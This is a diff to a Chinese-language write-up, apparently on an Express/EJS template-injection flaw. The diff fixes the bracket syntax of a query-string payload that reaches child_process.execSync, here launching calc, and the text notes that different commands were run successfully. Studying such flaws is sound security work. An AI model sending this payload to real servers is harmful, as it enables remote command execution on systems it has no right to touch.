@@ -150,7 +150,7 @@ utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);
 注意这里添加`cache=false`会被处理为字符串，而不是布尔值，因此`cache`字段放空即可
 
 ```js
-?settingsview options=1&settingsview options=process.mainModule.require('child_process').execSync('calc');&cache=
+?settings[view options]=1&settings[view options]=process.mainModule.require('child_process').execSync('calc');&cache=
 ```
 
 这时候尝试每次指定不同的命令，成功执行不同的命令。
